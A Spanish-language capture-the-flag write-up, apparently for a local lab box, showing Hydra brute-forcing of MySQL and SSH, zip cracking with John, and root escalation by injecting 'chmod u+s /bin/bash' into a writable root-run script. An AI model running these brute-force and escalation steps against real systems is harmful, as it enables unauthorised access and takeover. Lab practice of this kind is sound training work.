## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 3306 : MYSQL

Inspeccionando la web nos da comando para acceder a mysql pero sin la contraseña, toca encontrarla. Utilizo Hydra:

```bash
hydra -l rocket -P <WORDLIST> mysql://172.17.0.2 -t 64
```

Pass : password1

Entro a MySQL:

```bash
mysql -h 172.17.0.2 -u rocket -ppassword1 --ssl=0 
```

Dentro:

```bash
show databases;
use files_secret;
show tables;
select * from rutas;
```

Encuentro una ruta interesante: /unprivate/secret

Es una consola que al introducir un numero entre el 1 - 100 te descarga un archivo txt sin nada interesante, solo un numero exacto arroja algo diferente, toca atinarle.

Después de un rato doy con el numero 16 que arroja un comprimido en vez de un texto simple y veo que tiene contraseña. Utilizo John:

```bash
zip2john password16.zip > hash
john --wordlist=<WORDLIST> hash
```

Pass: password1

Dentro hay un archivo txt con posibles contraseñas. Teniendo en cuenta que hay 2 posibles usuarios, creo un archivo txt con los 2 y ejecuto un ataque de fuerza bruta:

```bash
hydra -L users.txt -P password16.txt ssh://172.17.0.2 -t 64 -I
```

User : grooti

Pass : YoSoYgRoOt

## Escalada:

```bash
ls -la /tmp
# Info:
-rwxrw-r-- 1 root  grooti  221 Jul 22 21:07 malicious.sh
```

Tiene permisos de escritura, así que aprovecho e inyecto código para darle permisos SUID a la bash y escalar a root.

Dentro del archivo:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

Espero unos segundos y ejecuto:

```bash
bash -p
```

Listo.
